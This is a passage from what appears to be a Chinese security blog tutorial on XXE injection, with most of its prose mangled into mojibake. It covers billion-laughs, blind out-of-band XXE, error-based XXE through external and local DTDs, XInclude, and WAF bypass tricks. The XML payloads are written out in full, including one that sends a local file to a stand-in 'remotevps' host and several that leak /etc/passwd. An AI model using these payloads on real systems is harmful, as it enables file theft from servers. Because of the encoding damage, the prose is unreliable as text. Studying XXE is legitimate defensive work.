åŒ…å«æ–‡æœ¬â€œ&lol9;â€ã€‚ç„¶è€Œï¼Œâ€œ&lol9;â€æ˜¯ä¸€ä¸ªå·²å®šä¹‰çš„å®ä½“ï¼Œå®ƒæ‰©å±•ä¸ºåŒ…å«åä¸ªâ€œ&lol8;â€å­—ç¬¦ä¸²ã€‚æ¯ä¸ªâ€œ&lol8;â€å­—ç¬¦ä¸²éƒ½æ˜¯ä¸€ä¸ªå·²å®šä¹‰çš„å®ä½“ï¼Œå¯ä»¥æ‰©å±•åˆ°10ä¸ªâ€œ&lol7;â€å­—ç¬¦ä¸²ï¼Œä»¥æ­¤ç±»æ¨ã€‚åœ¨å¤„ç†å®Œæ‰€æœ‰çš„å®ä½“æ‰©å±•ä¹‹åï¼Œè¿™ä¸ªå°(å°äº1 KB)çš„XMLå—å®é™…ä¸Šå°†åŒ…å«109 = 10äº¿ä¸ªâ€œlolâ€ï¼Œå ç”¨äº†å°†è¿‘3 gbçš„å†…å­˜ã€‚</p><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h2><p>Blind XXEï¼Œå­—é¢æ„æ€ä¹Ÿå°±æ˜¯æäº¤xmlçš„æœåŠ¡å™¨ç«¯ç‚¹ä¸å†è¿”å›æœ‰æ•ˆçš„æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬å‰é¢çš„ä¸€äº›åˆ©ç”¨æ–¹æ³•å°±è¦å¤±æ•ˆäº†ã€‚ä½†æ˜¯è§£å†³æ–¹æ³•è¿˜æ˜¯æœ‰çš„</p><h3 id="XXE-OOB-å¤–å¸¦æ•°æ®é€šé“"><a href="#XXE-OOB-å¤–å¸¦æ•°æ®é€šé“" class="headerlink" title="XXE OOB(å¤–å¸¦æ•°æ®é€šé“)"></a>XXE OOB(å¤–å¸¦æ•°æ®é€šé“)</h3><p><strong>æ¦‚å¿µ</strong></p><p>å¸¦å¤–æ•°æ®(outâ€”ofâ€”band data)ï¼Œæœ‰æ—¶ä¹Ÿç§°ä¸ºåŠ é€Ÿæ•°æ®(expedited data)ï¼Œ<br>æ˜¯æŒ‡è¿æ¥åŒæ–¹ä¸­çš„ä¸€æ–¹å‘ç”Ÿé‡è¦äº‹æƒ…ï¼Œæƒ³è¦è¿…é€Ÿåœ°é€šçŸ¥å¯¹æ–¹ã€‚è¿™ç§é€šçŸ¥åœ¨å·²ç»æ’é˜Ÿç­‰å¾…å‘é€çš„ä»»ä½•â€œæ™®é€šâ€(æœ‰æ—¶ç§°ä¸ºâ€œå¸¦å†…â€)æ•°æ®ä¹‹å‰å‘é€ã€‚å¸¦å¤–æ•°æ®è®¾è®¡ä¸ºæ¯”æ™®é€šæ•°æ®æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚</p><p>ç±»ä¼¼dnslogï¼Œæˆ–httpè®¿é—®æ„é€ ï¼Œè¾¾æˆæ•ˆæœ</p><p>å¸¦å¤–æ•°æ®æ˜¯æ˜ å°„åˆ°ç°æœ‰çš„è¿æ¥ä¸­çš„ï¼Œè€Œä¸æ˜¯åœ¨å®¢æˆ·æœºå’ŒæœåŠ¡å™¨é—´å†ç”¨ä¸€ä¸ªè¿æ¥ã€‚</p><p><strong>åˆ©ç”¨</strong></p><p>å¸¦å¤–æ•°æ®é€šé“çš„å»ºç«‹æ˜¯ä½¿ç”¨åµŒå¥—å½¢å¼ï¼Œåˆ©ç”¨å¤–éƒ¨å®ä½“ä¸­çš„URLå‘å‡ºè®¿é—®ï¼Œä»è€Œè·Ÿæ”»å‡»è€…çš„æœåŠ¡å™¨å‘ç”Ÿè”ç³»ã€‚ä½†æœ‰äº›æƒ…å†µä¸‹ä¸èƒ½åœ¨å®ä½“å®šä¹‰ä¸­å¼•ç”¨å‚æ•°å®ä½“ï¼Œå³æœ‰äº›è§£é‡Šå™¨ä¸å…è®¸åœ¨å†…å±‚å®ä½“ä¸­ä½¿ç”¨å¤–éƒ¨è¿æ¥ï¼Œæ— è®ºå†…å±‚æ˜¯ä¸€èˆ¬å®ä½“è¿˜æ˜¯å‚æ•°å®ä½“ã€‚</p><p>å°†åµŒå¥—çš„å®ä½“å£°æ˜æ”¾å…¥åˆ°ä¸€ä¸ªå¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œè¿™é‡Œä¸€èˆ¬æ˜¯æ”¾åœ¨æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·åšå¯ä»¥è§„é¿é”™è¯¯ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://remotevps/evil.xml&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">        %all;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><p>evil.xmlï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://remotevps/1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>å®ä½“remoteï¼Œallï¼Œsendçš„å¼•ç”¨é¡ºåºå¾ˆé‡è¦ï¼Œé¦–å…ˆå¯¹remoteå¼•ç”¨ç›®çš„æ˜¯å°†å¤–éƒ¨æ–‡ä»¶evil.xmlå¼•å…¥åˆ°è§£é‡Šä¸Šä¸‹æ–‡ä¸­ï¼Œç„¶åæ‰§è¡Œ%allï¼Œè¿™æ—¶ä¼šæ£€æµ‹åˆ°sendå®ä½“ï¼Œåœ¨rootèŠ‚ç‚¹ä¸­å¼•ç”¨sendï¼Œå°±å¯ä»¥æˆåŠŸå®ç°æ•°æ®è½¬å‘ã€‚å½“è¯·æ±‚å‘é€ä»¥åï¼Œæ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šå°±èƒ½æŸ¥çœ‹åˆ°1.txtä¸­çš„å†…å®¹ã€‚</p><h3 id="åŸºäºé”™è¯¯çš„XXE"><a href="#åŸºäºé”™è¯¯çš„XXE" class="headerlink" title="åŸºäºé”™è¯¯çš„XXE"></a>åŸºäºé”™è¯¯çš„XXE</h3><p>å½¢åŒblind xxeï¼Œå½“æˆ‘ä»¬æˆåŠŸåœ°è®©æœåŠ¡ç«¯è§£æäº†xmlæ–‡æ¡£ï¼Œå¾—åˆ°çš„å“åº”å´æ˜¯é€šç”¨çš„ã€‚æ¯”å¦‚æ·»åŠ è´¦å·çš„æ—¶å€™åªè¿”å›â€œæ·»åŠ æˆåŠŸâ€è¿™æ ·çš„å“åº”ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥è®©æœåŠ¡å™¨å“åº”æŠ¥é”™ä¿¡æ¯æ¥å¾—åˆ°æˆ‘ä»¬è¦çš„æ•æ„Ÿæ•°æ®</p><p>æœ‰ä¸¤ç§æŠ¥é”™çš„æ¥æºï¼š</p><ul><li>DTDç»“æ„çš„é”™è¯¯</li><li>XMLæ¶æ„éªŒè¯æ—¶çš„é”™è¯¯</li></ul><p><strong>å¤–éƒ¨DTD</strong></p><p>åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†è®©æœåŠ¡å™¨åŠ è½½ä¸€ä¸ªæ¶æ„DTDï¼Œå®ƒå°†åœ¨é”™è¯¯æ¶ˆæ¯ä¸­æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹(åªæœ‰å½“å¯ä»¥çœ‹åˆ°é”™è¯¯æ¶ˆæ¯æ—¶ï¼Œè¿™æ‰æœ‰æ•ˆ)ã€‚</p><p>å¯ä»¥ä½¿ç”¨æ¶æ„çš„å¤–éƒ¨DTDè§¦å‘åŒ…å«/etc/passwdæ–‡ä»¶å†…å®¹çš„XMLè§£æé”™è¯¯æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªDTDæ‰§è¡Œä»¥ä¸‹æ­¥éª¤:</p><p>å®šä¹‰ä¸€ä¸ªåä¸ºfileçš„XMLå‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å«<code>/etc/passwd</code>æ–‡ä»¶çš„å†…å®¹ã€‚</p><p>å®šä¹‰ä¸€ä¸ªåä¸ºevalçš„XMLå‚æ•°å®ä½“ï¼ŒåŒ…å«å¦ä¸€ä¸ªåä¸ºerrorçš„XMLå‚æ•°å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚é”™è¯¯å®ä½“å°†é€šè¿‡åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ¥è¯„ä¼°ï¼Œè¯¥æ–‡ä»¶çš„åç§°åŒ…å«æ–‡ä»¶å®ä½“çš„å€¼ã€‚</p><p>ä½¿ç”¨evalå®ä½“ï¼Œè¯¥å®ä½“å°†å¯¼è‡´æ‰§è¡Œé”™è¯¯å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚</p><p>ä½¿ç”¨é”™è¯¯å®ä½“ï¼Œä»¥ä¾¿é€šè¿‡å°è¯•åŠ è½½ä¸å­˜åœ¨çš„æ–‡ä»¶æ¥å¾—åˆ°æ•°æ®ï¼Œä»è€Œå¯¼è‡´è¿”å›åŒ…å«ä¸å­˜åœ¨æ–‡ä»¶çš„åç§°çš„é”™è¯¯æ¶ˆæ¯ï¼Œè¯¥åç§°æ­£æ˜¯<code>/etc/passwd</code>æ–‡ä»¶çš„å†…å®¹ã€‚</p><p>==æ³¨æ„ï¼š==å¤–éƒ¨DTDå…è®¸æˆ‘ä»¬åœ¨ç¬¬äºŒä¸ª(eval)ä¸­åŒ…å«ä¸€ä¸ªå®ä½“ï¼Œä½†åœ¨å†…éƒ¨DTDä¸­æ˜¯ç¦æ­¢çš„ã€‚å› æ­¤ï¼Œåœ¨ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨DTDçš„æƒ…å†µä¸‹(é€šå¸¸)å¼ºåˆ¶æ‰§è¡Œé”™è¯¯æ˜¯è¡Œä¸é€šçš„ã€‚</p><p><strong>å†…å¤–éƒ¨DTDæ··åˆ</strong></p><p>é‚£ä¹ˆï¼Œå½“å¸¦å¤–äº¤äº’è¢«é˜»æ­¢(å¤–éƒ¨è¿æ¥ä¸å¯ç”¨)æ—¶ï¼Œ blind XXEæ¼æ´æ€ä¹ˆåŠ?</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äºXMLè¯­è¨€è§„èŒƒä¸­çš„æ¼æ´ï¼Œä»ç„¶æœ‰å¯èƒ½è§¦å‘åŒ…å«æ•æ„Ÿæ•°æ®çš„é”™è¯¯æ¶ˆæ¯ã€‚å¦‚æœæ–‡æ¡£çš„DTDæ··åˆä½¿ç”¨å†…éƒ¨å’Œå¤–éƒ¨DTDå£°æ˜ï¼Œé‚£ä¹ˆå†…éƒ¨DTDå¯ä»¥é‡æ–°å®šä¹‰åœ¨å¤–éƒ¨DTDä¸­å£°æ˜çš„å®ä½“ã€‚å½“å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼Œåœ¨å¦ä¸€ä¸ªå‚æ•°å®ä½“çš„å®šä¹‰ä¸­ä½¿ç”¨XMLå‚æ•°å®ä½“çš„é™åˆ¶å°±æ”¾å®½äº†ã€‚</p><p>è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä»å†…éƒ¨DTDä¸­ä½¿ç”¨åŸºäºé”™è¯¯çš„XXEæŠ€æœ¯ï¼Œå‰ææ˜¯ä»–ä»¬ä½¿ç”¨çš„XMLå‚æ•°å®ä½“æ˜¯é‡æ–°å®šä¹‰åœ¨å¤–éƒ¨DTDä¸­å£°æ˜çš„å®ä½“ã€‚å½“ç„¶ï¼Œå¦‚æœå¸¦å¤–è¿æ¥è¢«é˜»å¡ï¼Œé‚£ä¹ˆå°±ä¸èƒ½ä»è¿œç¨‹ä½ç½®åŠ è½½å¤–éƒ¨DTDã€‚ç›¸åï¼Œå®ƒéœ€è¦æ˜¯åº”ç”¨æœåŠ¡å™¨æœ¬åœ°çš„å¤–éƒ¨DTDæ–‡ä»¶ã€‚ä»æœ¬è´¨ä¸Šè¯´ï¼Œæ”»å‡»æ¶‰åŠè°ƒç”¨ç¢°å·§å­˜åœ¨äºæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šçš„DTDæ–‡ä»¶ï¼Œå¹¶å°†å…¶é‡æ–°ç”¨äºé‡å®šä¹‰ç°æœ‰å®ä½“ï¼Œä»è€Œè§¦å‘åŒ…å«æ•æ„Ÿæ•°æ®çš„è§£æé”™è¯¯ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šä½äºä½ç½®<code>/usr/local/app/schema</code>ä¸Šæœ‰ä¸€ä¸ªDTDæ–‡ä»¶è¿™ä¸ªdtdæ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªåä¸º<code>custom_entity</code>çš„å®ä½“ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤å¦‚ä¸‹æ··åˆDTDæ¥è§¦å‘åŒ…å«<code>/etc/passwd</code>æ–‡ä»¶å†…å®¹çš„XMLè§£æé”™è¯¯æ¶ˆæ¯:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % custom_entity &#x27;</span><br><span class="line">            &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">            &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">            &amp;#x25;eval;</span><br><span class="line">            &amp;#x25;error;</span><br><span class="line">            &#x27;&gt;</span><br><span class="line">        %local_dtd;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªDTDæ‰§è¡Œä»¥ä¸‹æ­¥éª¤:<br>å®šä¹‰åä¸º<code>local_dtd</code>çš„XMLå‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å«å­˜åœ¨äºæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„å¤–éƒ¨DTDæ–‡ä»¶çš„å†…å®¹ã€‚<br>é‡æ–°å®šä¹‰åä¸º<code>custom_entity</code>çš„XMLå‚æ•°å®ä½“ï¼Œè¯¥å®ä½“å·²ç»åœ¨å¤–éƒ¨DTDæ–‡ä»¶ä¸­å®šä¹‰ã€‚å®ä½“è¢«é‡æ–°å®šä¹‰ä¸ºåŒ…å«å‰é¢æè¿°çš„åŸºäºé”™è¯¯çš„XXEæ¼æ´ï¼Œç”¨äºè§¦å‘åŒ…å«<code>/etc/passwd</code>æ–‡ä»¶å†…å®¹çš„é”™è¯¯æ¶ˆæ¯ã€‚<br>ä½¿ç”¨<code>local_dtd</code>å®ä½“ï¼Œä»¥ä¾¿è§£é‡Šå¤–éƒ¨DTDï¼ŒåŒ…æ‹¬é‡æ–°å®šä¹‰çš„<code>custom_entity</code>å®ä½“çš„å€¼ã€‚è¿™å°†å¯¼è‡´æ‰€éœ€çš„é”™è¯¯æ¶ˆæ¯ã€‚</p><p>å¯ä»¥å®‰è£…ç›¸åŒçš„æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿ/è½¯ä»¶å’Œæœç´¢ä¸€äº›é»˜è®¤dtdï¼Œæˆ–æŠ“å–ç³»ç»Ÿå†…çš„é»˜è®¤dtdåˆ—è¡¨ï¼Œå¹¶æ£€æŸ¥å…¶ä¸­æ˜¯å¦å­˜åœ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><h2 id="XIncludeæ”»å‡»"><a href="#XIncludeæ”»å‡»" class="headerlink" title="XIncludeæ”»å‡»"></a>XIncludeæ”»å‡»</h2><p>xincludeå¯ä»¥ç†è§£ä¸ºxml include</p><p>ç»“åˆæ–‡ä»¶åŒ…å«</p><p>è¦æ‰§è¡ŒXIncludeæ”»å‡»ï¼Œéœ€è¦å¼•ç”¨XIncludeåç§°ç©ºé—´å¹¶æä¾›å¸Œæœ›åŒ…å«çš„æ–‡ä»¶çš„è·¯å¾„ã€‚ä¾‹å¦‚:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">productId=</span><br><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;</span><br><span class="line">&lt;/foo&gt;</span><br><span class="line">&amp;storeId=1</span><br></pre></td></tr></table></figure><h2 id="XSTLæ”»å‡»"><a href="#XSTLæ”»å‡»" class="headerlink" title="XSTLæ”»å‡»"></a>XSTLæ”»å‡»</h2><p>XSLTï¼ˆæ‰©å±•æ ·å¼è¡¨è½¬æ¢è¯­è¨€ï¼‰æ˜¯ä¸€ç§å¯¹ XML æ–‡æ¡£è¿›è¡Œè½¬åŒ–çš„è¯­è¨€ã€‚XML æ–‡æ¡£é€šè¿‡ XSLT è½¬åŒ–åå¯ä»¥å˜æˆä¸ºå¦ä¸€ä»½ä¸åŒçš„ XML æ–‡æ¡£ï¼Œæˆ–è€…å…¶ä»–ç±»å‹çš„æ–‡æ¡£ï¼Œä¾‹å¦‚ HTML æ–‡æ¡£ã€ CSV æ–‡ä»¶ã€çº¯æ–‡æœ¬æ–‡ä»¶ç­‰ã€‚</p><p>æœ‰å…³å…·ä½“çš„è½¬åŒ–è¿‡ç¨‹ï¼Œè¯·å‚è€ƒï¼š<a href="http://www.w3school.com.cn/xsl/xsl_transformation.asp">sourse</a></p><p>å› ä¸ºåŒæ ·å…·æœ‰XMLæ–‡æ¡£ï¼Œé‚£ä¹Ÿæœ‰XXEçš„æ¼æ´éšæ‚£ã€‚å…³äºå…·ä½“çš„åº”ç”¨ï¼Œå¯å‚è€ƒæ–‡ç« ï¼š<a href="https://bbs.pediy.com/thread-222921.htm">sourse</a></p><h1 id="XXE-Bypass"><a href="#XXE-Bypass" class="headerlink" title="XXE Bypass"></a>XXE Bypass</h1><h2 id="ä¸Šä¼ æ–‡ä»¶ç»•è¿‡"><a href="#ä¸Šä¼ æ–‡ä»¶ç»•è¿‡" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶ç»•è¿‡"></a>ä¸Šä¼ æ–‡ä»¶ç»•è¿‡</h2><p>æœ‰äº›åº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶ååœ¨æœåŠ¡å™¨ç«¯å¤„ç†è¿™äº›æ–‡ä»¶ã€‚ä¸€äº›å¸¸è§çš„æ–‡ä»¶æ ¼å¼ä½¿ç”¨XMLæˆ–åŒ…å«XMLå­ç»„ä»¶ã€‚åŸºäºxmlçš„æ ¼å¼åŒ…æ‹¬DOCXè¿™æ ·çš„åŠå…¬æ–‡æ¡£æ ¼å¼å’ŒSVGè¿™æ ·çš„å›¾åƒæ ¼å¼ã€‚</p><p>ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å…è®¸ç”¨æˆ·ä¸Šä¼ å›¾åƒï¼Œå¹¶åœ¨ä¸Šä¼ ååœ¨æœåŠ¡å™¨ä¸Šå¤„ç†æˆ–éªŒè¯è¿™äº›å›¾åƒã€‚å³ä½¿åº”ç”¨ç¨‹åºå¸Œæœ›æ¥æ”¶PNGæˆ–JPEGä¹‹ç±»çš„æ ¼å¼ï¼Œæ‰€ä½¿ç”¨çš„å›¾åƒå¤„ç†åº“ä¹Ÿå¯èƒ½æ”¯æŒSVGå›¾åƒã€‚ç”±äºSVGæ ¼å¼ä½¿ç”¨XMLï¼Œæ”»å‡»è€…å¯ä»¥æäº¤æ¶æ„çš„SVGå›¾åƒï¼Œä»è€Œè¾¾åˆ°é’ˆå¯¹XXEæ¼æ´çš„éšè—æ”»å‡»é¢ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;</span><br><span class="line">&lt;image xlink:href=&quot;file:///etc/hostname&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p>å¦å¤–ï¼Œè®¸å¤šå¸¸è§çš„æ–‡æ¡£æ ¼å¼ï¼Œä¾‹å¦‚docï¼Œdocxï¼Œodtç­‰ï¼Œå…¶å®è´¨æ˜¯ä¸€ä¸ªzipæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«xmlæ–‡ä»¶ã€‚å½“æˆ‘ä»¬ç”¨winrarã€7zç­‰å·¥å…·æ‰“å¼€è¿™ç±»æ–‡ä»¶å°±èƒ½çœ‹åˆ°</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›æ–‡ä»¶æ¥ç»•è¿‡xxeé˜²å¾¡ã€‚ <a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a>å°±æ˜¯ä¸€ä¸ªç”¨äºå‘æ­¤ç±»æ–‡ä»¶ä¸­åµŒå…¥XXE Payloadçš„å·¥å…·ã€‚å®ƒæ”¯æŒä»¥ä¸‹æ–‡ä»¶æ ¼å¼çš„åˆ›å»ºæˆ–ä¿®æ”¹ï¼š</p><ul><li>DOCX/XLSX/PPTX</li><li>ODT/ODG/ODP/ODS</li><li>SVG</li><li>XML</li><li>PDF (experimental)</li><li>JPG (experimental)</li><li>GIF (experimental)</li></ul><p>oxml_xxeçš„å·¥ä½œåŸç†åˆ†ä¸ºä¸¤ç§ï¼š</p><ol><li>ç›´æ¥å»ºç«‹ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ¨¡å¼ä¼šè‡ªåŠ¨æ·»åŠ DOCTYPEå¹¶å°†XMLå®ä½“æ’å…¥åˆ°ç”¨æˆ·é€‰æ‹©çš„æ–‡ä»¶ä¸­ã€‚</li><li>æ›¿æ¢æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼Œæ­¤æ¨¡å¼ä¼šéå†æŸ¥æ‰¾æ–‡æ¡£ä¸­çš„ç¬¦å·Â§ã€‚å¹¶ç”¨XMLå®ä½“(â€œ&xxe;â€)æ›¿æ¢æ­¤ç¬¦å·çš„æ‰€æœ‰å®ä¾‹ã€‚æ³¨æ„ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æ‰“å¼€æ–‡æ¡£å¹¶æ’å…¥Â§æ¥æ›¿æ¢å®ƒã€‚å¸¸è§çš„ç”¨ä¾‹æ˜¯webåº”ç”¨ç¨‹åºï¼Œå®ƒè¯»å–xlsxï¼Œç„¶åå°†ç»“æœæ‰“å°åˆ°å±å¹•ä¸Šã€‚åˆ©ç”¨XXEæˆ‘ä»¬ä¾¿å¯ä»¥å°†å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šã€‚</li></ol><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><p><strong>base64</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</span><br></pre></td></tr></table></figure><p>ä»…å½“XMLæœåŠ¡å™¨æ¥å—data://åè®®æ—¶ï¼Œæ­¤æ–¹æ³•æ‰æœ‰æ•ˆã€‚</p><p><strong>utf-7</strong></p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?--&gt;+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ä¸¤ç§ç¼–ç </strong></p><p>åœ¨åŒä¸€ä¸ªæ–‡æ¡£é‡ŒåŒæ—¶ä½¿ç”¨ä¸¤ç§ç¼–ç ï¼Œä»è€Œè¿·æƒ‘ WAFï¼Œè¯´æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16BE&quot;?&gt;&#x27; &gt; payload.xmlecho &#x27;&lt;a&gt;1337&lt;/a&gt;&#x27; | iconv -f UTF-8 -t UTF-16BE &gt;&gt; payload.xml</span><br></pre></td></tr></table></figure><p>å¤´éƒ¨å£°æ˜ä½¿ç”¨ UTF-8 ç¼–ç ï¼Œè€Œä¹‹åä½¿ç”¨ UTF-16 ç¼–ç ã€‚å½“è§£æå™¨è¯»åˆ° XML å£°æ˜çš„ç¼–ç æ—¶ï¼Œä¼šåˆ‡æ¢åˆ°è¯¥ç¼–ç ï¼ˆç»§ç»­è§£æï¼‰ï¼Œå³ä½¿è¯¥ç¼–ç ä¸å£°æ˜éƒ¨åˆ†æ‰€ä½¿ç”¨çš„ç¼–ç ä¸åŒã€‚ä¸æ­¤åŒæ—¶ï¼ŒWAF ä¸€èˆ¬ä¸æ”¯æŒè¿™ç§å¤šç§ç¼–ç çš„ XML æ–‡æ¡£</p><p><strong>åœ¨å®ä½“å†…ç¼–ç </strong></p><p>æ˜¯æ–°çš„XMLæŠ€æœ¯ï¼Œå¯¹å†…éƒ¨å®ä½“ä¸­çš„ä»»ä½•DTD/XMLè¿›è¡Œç¼–ç ï¼ˆç¼–ç æ ¼å¼æ˜¯å­—ç¬¦ä¸²16è¿›åˆ¶+UTF-8å½¢å¼ï¼‰ï¼Œè¾¾åˆ°WAF bypassçš„æ•ˆæœï¼<br>å½“æ²¡æœ‰XXEï¼Œä½†XMLä¸»ä½“ä¸­å­˜åœ¨æ¼æ´(ä¾‹å¦‚SQLæ³¨å…¥)æ—¶èµ·ä½œç”¨</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_07.png" alt=""></p><p><strong>æ–‡æ¡£ä¸­çš„é¢å¤–ç©ºæ ¼</strong></p><p>ç”±äºXXEé€šå¸¸åœ¨XMLæ–‡æ¡£çš„å¼€å¤´ï¼Œæ‰€ä»¥æ¯”è¾ƒçœäº‹å„¿çš„WAFå¯ä»¥é¿å…å¤„ç†æ•´ä¸ªæ–‡æ¡£ï¼Œè€Œåªè§£æå®ƒçš„å¼€å¤´ã€‚ä½†æ˜¯ï¼ŒXMLæ ¼å¼å…è®¸åœ¨æ ¼å¼åŒ–æ ‡è®°å±æ€§æ—¶ä½¿ç”¨ä»»æ„æ•°é‡çš„ç©ºæ ¼ï¼Œå› 